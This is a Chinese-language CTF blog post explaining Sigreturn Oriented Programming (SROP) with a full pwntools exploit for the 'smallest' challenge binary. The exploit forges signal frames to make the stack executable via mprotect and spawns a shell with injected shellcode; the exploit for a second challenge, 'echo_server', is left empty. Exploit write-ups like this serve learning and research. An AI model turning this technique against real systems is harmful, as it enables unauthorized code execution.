---
title: SROP_SMALLEST
date: 2019-04-10 21:32:35
tags:
layout: post
---
最近发现自己技能点很多都没有点...平时忙了点抽点时间把技能点上...SROP
<!--more-->
# SROP
SROP(Sigreturn Oriented Programming) 于 2014 年被 Vrije Universiteit Amsterdam 的 Erik Bosman 提出，其相关研究Framing Signals — A Return to Portable Shellcode发表在安全顶级会议 Oakland 2014 上，被评选为当年的 Best Student Papers。#摘自[ctfwiki][1]

[paper][2]
[slide][2]

原理及内容在`ctfwiki`上已经介绍的比较清楚
![nier](https://github.com/n132/Watermalon/raw/master/UNK/smallest/SIGNAL.png)
# 过程
执行0xf号(将栈上已经预先放置好的数据弹出)==>控制执行流
可以设置esp达到连续攻击的效果.
# 要求
* 较大空间 放置signal frame(约0x100)
* 泄露地址
* syscall-address
# 难点
理解了感觉没什么难的..利用了15号调用可以劫持执行流..
想出这个的人真厉害...
# exp OF smallest
[binary][4]
```python
from pwn import *
context.log_level='debug'
main=0x0000000004000B0
syscall=0x00000000004000be
p=process('./smallest')


context.arch='amd64'
shellcode=asm(shellcraft.sh())

p.send(p64(main)*3)
sleep(0.3)
#1

raw_input()
p.send("\xb3")

p.read(8)

stack=u64(p.read(8))
log.warning(hex(stack))

sig=SigreturnFrame()
sig.rax=0
sig.rdi=0
sig.rsi=stack&0xfffffffffffffff0
sig.rdx=0x200
sig.rip=0x4000be
sig.rsp=stack&0xfffffffffffffff0
ret=0x00000000004000c0
#2
gdb.attach(p)
raw_input()

p.send(p64(main)+p64(0)+str(sig))
sleep(0.3)
#3

payload=p64(0x0000000004000Be)+p64(0)[:-1]
raw_input()
p.send(payload)
sleep(0.3)

sig=SigreturnFrame()
sig.rax=10
sig.rdi=stack&0xffffffffffff0000
sig.rsi=0x10000
sig.rdx=7
sig.rip=0x4000be
sig.rsp=0x110+(stack&0xfffffffffffffff0)
ret=0x00000000004000c0
payload=p64(main)+p64(0)
raw_input()
p.send(payload+str(sig)+p64(0xdeadbeef)+p64((stack&0xffffffffffff0)+0x118)+asm(shellcraft.sh()))

sleep(0.3)
payload=p64(0x4000Be)+p64(0)[:-1]
raw_input()
p.send(payload)


p.interactive()
```
# review
发现调试的时候可以加上raw_input防止输入乱序

# echo_server
[binary][3]
顺便放一题partial write + ret slide
发现栈其实很`随便`...
aslr下需要概率打通.
# exp
```python

```

[1]:https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop/#srop
[2]:https://github.com/n132/Watermalon/tree/master/UNK/smallest
[3]:https://github.com/n132/Watermalon/tree/master/UNK/echo
[4]:https://github.com/n132/Watermalon/tree/master/UNK/smallest